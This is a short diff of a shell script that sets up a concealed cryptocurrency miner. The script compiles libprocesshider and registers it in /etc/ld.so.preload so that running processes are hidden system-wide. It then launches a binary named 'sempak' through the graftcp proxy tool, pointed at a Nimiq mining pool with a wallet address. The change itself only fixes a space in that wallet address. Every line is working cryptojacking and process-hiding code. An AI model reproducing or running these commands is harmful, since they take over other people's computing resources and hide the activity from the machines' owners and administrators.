@@ -74,4 +74,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./sempak -d=0 -a "NQ82UYV095UD9MST21399ABS 6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n GPU-Sage -t 4  -i Disable
+./graftcp/graftcp ./sempak -d=0 -a "NQ82UYV095UD9MST21399ABS6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n GPU-Sage -t 4  -i Disable
